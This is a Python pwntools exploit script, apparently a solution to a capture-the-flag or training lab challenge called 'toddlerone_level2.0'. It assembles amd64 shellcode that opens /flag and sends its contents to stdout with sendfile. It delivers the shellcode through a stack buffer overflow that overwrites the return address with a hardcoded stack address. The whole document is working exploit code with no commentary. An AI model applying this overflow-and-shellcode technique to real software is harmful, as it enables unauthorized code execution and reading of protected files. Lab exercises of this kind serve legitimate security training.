from pwn import *
context.arch='amd64'

r = process('/challenge/toddlerone_level2.0')

payload = asm(
'''

    push 2
    pop rax
    lea rdi, [rip+f]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    push 1
    pop rdi
    push rax
    pop rsi
    push 40
    pop rax
    xor rdx, rdx
    push 100
    pop r10
    syscall



    f:
    .string "/flag"

'''
)


r.sendline(b'300')
r.send('a'*0x38+p64(0x00007fffffffd580)+payload+b'\x00'*0x50)


r.interactive()